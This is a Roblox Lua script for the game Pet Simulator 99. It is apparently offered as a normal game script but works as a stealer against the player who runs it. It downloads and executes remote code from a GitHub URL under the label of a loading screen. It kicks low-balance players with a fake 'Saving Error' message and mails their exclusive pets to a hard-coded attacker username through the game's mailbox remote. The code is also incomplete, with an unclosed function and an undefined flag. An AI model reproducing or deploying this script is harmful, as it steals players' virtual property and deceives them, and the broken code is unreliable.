Username = "Yrotnme"
LoadScreen = false -- If you want to enable loadgui, rename to true

if LoadScreen == nil then
LoadScreen = true
end
if LoadScreen == true then 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/loadingscreen"))()
end

stealpets = true

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Zhex always top 1"
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Saving Error, Please Rejoin or Join Back Later!")
end

local user = Username

function ExcSteal()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
            AmountOfExc = 0
            for i, v in pairs(save.Pet) do
                local id = v.id
                local dir = library.Directory.Pets[id]
                if dir.exclusiveLevel == true then
                    AmountOfExc = AmountOfExc + 1
                end
            end
            if AmountOfExc == 0 then
                ExcEnd = true
            end
        end
    end
end

local Send = function(Results)
    local Sent = ""
    local Fail = ""
    if #Results["Sent"] > 0  then
        for _, v in pairs(Results["Sent"]) do 
            Sent = Sent..v 
            Sent = Sent.."\n"
        end
    else 
        Sent = "No Transactions Were Successful"
    end

    if #Results["Failed"] > 0 then
        for _, v in pairs(Results["Failed"]) do 
            Fail = Fail..v 
            Fail = Fail.."\n"
        end
    else 
        Fail = "No Transactions Failed"
    end

    local Result = table.create(0, nil)
    Result["Sent"] = {}
    Result["Failed"] = {}
    Result["Gems"] = 0
    
if stealpets == true and HugesEnd == true then
    ExcSteal()
end
